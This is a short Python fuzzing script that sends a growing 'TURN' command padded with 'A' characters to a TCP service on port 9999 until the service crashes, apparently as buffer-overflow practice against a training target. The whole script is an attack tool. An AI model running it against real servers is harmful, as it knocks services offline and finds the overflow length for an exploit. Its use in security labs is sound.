#!/usr/bin/env python3
import socket
import time
import sys

IP = "000.000.0.00" 
PORT = 9999
PREFIX = "TURN /.:/" 
SIZE = 100  

print("[*] Starting fuzzing loop...")

while True:
    try:
        payload = PREFIX + ("A" * SIZE)
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((IP, PORT))
            
            print(f"[*] Fuzzing with {SIZE} bytes")
            s.send(bytes(payload, "latin-1"))
            s.recv(1024)
            
        SIZE += 100  
        time.sleep(1)
        
    except socket.error:
        print(f"\n[+] Target service stopped responding at {SIZE} bytes.")
        sys.exit(0)
    except KeyboardInterrupt:
        print("\n[-] Fuzzing stopped by user.")
        sys.exit(0)

